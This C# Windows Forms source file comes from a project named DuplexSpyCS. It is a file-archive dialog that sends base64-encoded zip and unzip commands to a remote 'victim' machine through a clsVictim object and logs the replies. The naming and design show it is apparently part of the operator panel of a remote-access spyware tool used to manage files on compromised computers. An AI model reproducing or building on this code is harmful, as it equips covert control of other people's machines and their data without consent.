using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileArchive : Form
    {
        public frmManager f_mgr;

        public clsVictim v;
        public List<string[]> lsEntries; //Index 0: Folder/File, 1: Full Path.
        public ArchiveAction archiveAction;
        public string currentPath;

        public bool CloseWhenFinished = false;

        public frmFileArchive()
        {
            InitializeComponent();
        }

        public void ShowState(ArchiveAction action, List<string[]> l1, List<string[]> l2, string archiveName = null)
        {
            AddLogs("Received remote data, start processing...");

            ListView lv = action == ArchiveAction.Compress ? listView1 : listView2;

            //Find Item
            ListViewItem FindItem(string text, bool file)
            {
                ListViewItem x = null;
                Invoke(new Action(() =>
                {
                    foreach (ListViewItem item in lv.Items)
                    {
                        string[] entry = (string[])item.Tag;
                        if (entry[1] == text && ((file && entry[0] == "f") || (!file && entry[0] == "d")))
                        {
                            x = item;
                            break;
                        }
                    }
                }));

                return x;
            }

            if (l1 != null)
            {
                foreach (string[] entry in l1)
                {
                    ListViewItem item = FindItem(entry[0], false);
                    if (item == null)
                        continue;

                    Invoke(new Action(() =>
                    {
                        switch (action)
                        {
                            case ArchiveAction.Compress:
                                item.SubItems[2].Text = entry[1];
                                break;
                            case ArchiveAction.Extract:
                                item.SubItems[1].Text = entry[1];
                                break;
                        }
                    }));
                }
            }

            if (l2 != null)
            {
                foreach (string[] entry in l2)
                {
                    ListViewItem item = FindItem(entry[0], true);
                    if (item == null)
                        continue;

                    Invoke(new Action(() =>
                    {
                        switch (action)
                        {
                            case ArchiveAction.Compress:
                                item.SubItems[2].Text = entry[1];
                                break;
                            case ArchiveAction.Extract:
                                item.SubItems[1].Text = entry[1];
                                break;
                        }
                    }));
                }
            }

            Invoke(new Action(() => f_mgr.fileLV_Refresh()));

            if (archiveName != null)
            {
                AddLogs($"Compress successfully: {archiveName}");
            }
            else
            {
                AddLogs("Extract successfully.");
            }
        }

        public void AddLogs(string msg)
        {
            DateTime now = DateTime.Now;
            Invoke(new Action(() =>
            {
                richTextBox1.AppendText($@"[{now.ToString("t")}] {msg}");
                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        private void ItemShowName(bool fullPath)
        {
            ListView lv = archiveAction == ArchiveAction.Compress ? listView1 : listView2;
            foreach (ListViewItem item in lv.Items)
            {
                string[] entry = (string[])item.Tag;
                if (fullPath)
                    item.Text = entry[1];
                else
                    item.Text = Path.GetFileName(entry[0] == "d" ? entry[1].Substring(0, entry[1].Length - 1) : entry[1]);
            }
        }

        private void FileCompress()
        {
            List<string> lsFolders = new List<string>();
            List<string> lsFiles = new List<string>();
            foreach (ListViewItem item in listView1.Items)
            {
                string[] entry = (string[])item.Tag;
                if (entry[0] == "d")
                    lsFolders.Add(entry[1]);
                else
                    lsFiles.Add(entry[1]);
            }

            v.fnSendCommand(string.Join("|", new string[]
            {
                "file",
                "zip",
                string.Join(",", lsFolders.Select(x => clsCrypto.b64E2Str(x)).ToArray()),
                string.Join(",", lsFiles.Select(x => clsCrypto.b64E2Str(x)).ToArray()),
                Path.Combine(currentPath, textBox1.Text),
            }));

            AddLogs("Start compressing...");
        }

        private void FileExtract()
        {
            string[] entries = listView2
                .Items.Cast<ListViewItem>()
                .Select(x => ((string[])x.Tag)[1])
                .ToArray();
            string[] b64Entries = entries.Select(x => clsCrypto.b64E2Str(x)).ToArray();

            /* Combobox1 Index:
             *      0: Each to Seperate Folder
             *      1: Extract to Specific Folder
             *      2: Extract Here
             */
            int method = comboBox1.SelectedIndex;
            string dirName = method == 1 ? textBox2.Text : string.Empty;
            string payload = string.Join("|", new string[]
            {
                "file",
                "unzip",
                method.ToString(),
                string.Join(",", b64Entries),
                dirName,
                checkBox1.Checked ? "1" : "0",
            });

            v.fnSendCommand(payload);

            AddLogs("Start extracting...");
        }

        void setup()
        {
            //Debug
            if (v == null)
            {
                MessageBox.Show("Victim is null");
                ActiveForm.Close();
            }

            tabControl1.SelectedIndex = (int)archiveAction;
            comboBox1.SelectedIndex = 0;
            textBox1.Text = clsTools.GenerateFileName("zip");

            //ListView
            foreach (string[] entry in lsEntries)
            {
                ListViewItem item = new ListViewItem();
                item.Text = entry[1];
                if (archiveAction == ArchiveAction.Compress)
                    item.SubItems.Add(entry[0] == "d" ? "Folder" : "File");
                item.SubItems.Add("?");
                item.Tag = entry;

                if (archiveAction == ArchiveAction.Compress)
                    listView1.Items.Add(item);
                else if (archiveAction == ArchiveAction.Extract)
                    listView2.Items.Add(item);
            }

            AddLogs("Load file/folder: " + (archiveAction == ArchiveAction.Compress ? listView1 : listView2).Items.Count.ToString());

            ItemShowName(false);

            AddLogs("Setup finished");
        }

        private void frmFileArchive_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            FileCompress();

            tabControl1.SelectedIndex = 2;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            FileExtract();

            tabControl1.SelectedIndex = 2;
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\FileMgrArchive").Show();
        }
    }
}
